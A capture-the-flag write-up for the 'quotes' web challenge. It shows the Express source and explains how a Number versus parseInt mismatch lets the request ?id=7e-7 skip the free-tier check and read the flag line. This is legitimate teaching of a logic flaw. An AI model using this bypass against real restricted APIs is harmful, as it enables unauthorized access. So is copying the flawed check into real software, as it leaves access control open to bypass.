## quotes [100 pts]

**Category:** Web
**Solves:** 106

## Description
I'm launching 🚀 my new ✨ SaaS providing quotes 📝 as an API 💪!

quotes.challs.pwnoh.io/quote

### Solution

Checking the source code, we see that there are following functionallities in the application:

- register user and set the cookie in /register route
- fetch quote data by sending query param id (the server will fetch quote based on id received from quote file)

here is the code provided to us:
```javascript
import express from "express";
import jwt from "jsonwebtoken";
import path from "path";
import fs from "fs";

const SECRET_KEY = process.env.SECRET_KEY || "secret";
const COOKIE_NAME = "quotes-auth";

const FREE_TIER_QUOTE_LIMIT = 5;

const app = express();

app.get("/quote", (req, res) => {
  const { id, random } = req.query;
  const { cookie } = req.headers;

  if (!cookie) {
    res.status(401);
    res.send({ error: "Not authenticated" });
    return;
  }

  const cookies = cookie.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.split("=").map((c) => c.trim());
    acc[key] = value;
    return acc;
  }, {});

  const cookieToken = cookies[COOKIE_NAME];

  if (!cookieToken) {
    res.status(401);
    res.send({ error: "Not authenticated" });
    return;
  }

  let decoded;
  try {
    decoded = jwt.verify(cookieToken, SECRET_KEY);
  } catch (e) {
    res.status(403);
    res.send({ error: "Invalid token" });
    return;
  }

  const filepath = path.resolve("./quotes");
  const quotes = fs.readFileSync(filepath, "utf-8").split("\n");

  if (random && random === "true") {
    const i = Math.floor(Math.random() * FREE_TIER_QUOTE_LIMIT);

    if (!decoded.subscribed && i >= FREE_TIER_QUOTE_LIMIT) {
      res.status(500);
      res.send({ error: "Not a paying subscriber" });
      return;
    }

    const quote = quotes[i];

    res.status(200);
    res.send({ quote, id: i });
    return;
  }

  if (id) {
    const i = Number(id);

    if (!decoded.subscribed && i >= FREE_TIER_QUOTE_LIMIT) {
      res.status(500);
      res.send({ error: "Not a paying subscriber" });
      return;
    }

    if (i < 0 || i >= quotes.length) {
      res.status(500);
      res.send({ error: "Invalid quote ID" });
      return;
    }

    const quote = quotes[parseInt(i)];

    res.status(200);
    res.send({ quote, id: i });
    return;
  }

  res.status(500);
  res.send({ error: "Unable to get quote" });
});

app.get("/register", (req, res) => {
  const token = jwt.sign(
    {
      subscribed: false,
    },
    SECRET_KEY,
    { expiresIn: "1h" }
  );

  res.cookie(COOKIE_NAME, token, {
    httpOnly: true,
    secure: true,
    maxAge: 3600000,
  });
  res.status(200);
  res.send({ message: "Signed in!" });
});

app.listen(process.env.PORT || 3000);

```

and there is quotes file with below content:
```
If you know the enemy, and know yourself, you need not fear the result of a hundred battles. - Sun Tzu, The Art of War
The opportunity of defeating the enemy is provided by the enemy himself. - Sun Tzu, The Art of War
Be extremely subtle, even to the point of formlessness. - Sun Tzu, The Art of War
Whatever you do, don't reveal all your techniques in a YouTube video, you fool, you moron. - Sun Tzu, The Art of War
Let your plans be dark and impenetrable as night, and when you move, fall like a thunderbolt. - Sun Tzu, The Art of War
All war is deception - Sun Tzu, The Art of War
All men can see the tactics whereby I conquer, but what none can see is the strategy out of which victory is evolved. - Sun Tzu, The Art of War
bctf{fake_flag}
```

The flag is in index id=7. so if are able to read `quotes[7]`, will get the flag.

And as you can see two ideas to solve challenge exists:

1- break jwt and set subscribed value in jwt to be able to send id=7 and read the quote that contains the flag
2- bypass id resitrictions and get to the part we are able to send 7 and read the flag.


I spent a lot of time on solution 1, and tried to brute-force, try to find exploits in jwt of server and .., but none works.
After ctf i find out that the key was to bypass the id filtering using some techniques which i will tell later.

The part that is important for us is:
```javascript
const i = Number(id);

if (!decoded.subscribed && i >= FREE_TIER_QUOTE_LIMIT) {
  res.status(500);
  res.send({ error: "Not a paying subscriber" });
  return;
}

if (i < 0 || i >= quotes.length) {
  res.status(500);
  res.send({ error: "Invalid quote ID" });
  return;
}

const quote = quotes[parseInt(i)];

res.status(200);
res.send({ quote, id: i });
return;
```

first the id is passed to `Number` method, then using `parseInt` it passed to quotes.

for do the tests we just need to setup an env to test something. i opened a browser and in console section did some tests:

```javascript
Number(7e-1) > 0
true
Number(7e-1) < 6
true
```

as we can `7e-1` which is equal to `0.7` can bypass the first condition and get us to the `quotes[parseInt(i)]` section.

But the problem is:
```javascript
parseInt(7e-1)
0 
```

I tried some fuzzing and changed value from -1 to other values and noticed:
```javascript
parseInt(7e-1)
0
parseInt(7e-2)
0
parseInt(7e-3)
0
parseInt(7e-4)
0
parseInt(7e-5)
0
parseInt(7e-6)
0
parseInt(7e-7)
7
````

As you can see `7e-7` is parsed as 7 value.

requesting this value will give us the flag. 

- First check this link to get session in browser: `https://quotes.challs.pwnoh.io/register`

- Then checking this link will give us the flag: `https://quotes.challs.pwnoh.io/quote?id=7e-7`
